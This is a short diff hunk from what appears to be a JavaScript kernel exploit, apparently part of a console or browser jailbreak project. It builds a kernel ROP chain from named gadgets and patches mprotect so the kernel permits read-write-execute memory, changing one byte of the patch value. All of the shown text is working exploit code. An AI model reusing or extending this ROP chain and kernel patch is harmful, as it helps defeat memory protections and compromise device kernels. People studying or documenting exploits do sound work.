@@ -426,7 +426,7 @@ function kernExploit() {
 	krop.push(window.gadgets["mov [rax], rsi"]);//present
 
 	// Patch mprotect: Allow RWX (read-write-execute) mapping
-	var mprotect_patch = new int64(0x9090FA38, 0x90909090);
+	var mprotect_patch = new int64(0x9090EA38, 0x90909090);
 	krop.push(window.gadgets["pop rax"])
 	krop.push(kscratch.add32(0x90));
 	krop.push(window.gadgets["mov rax, [rax]"]);
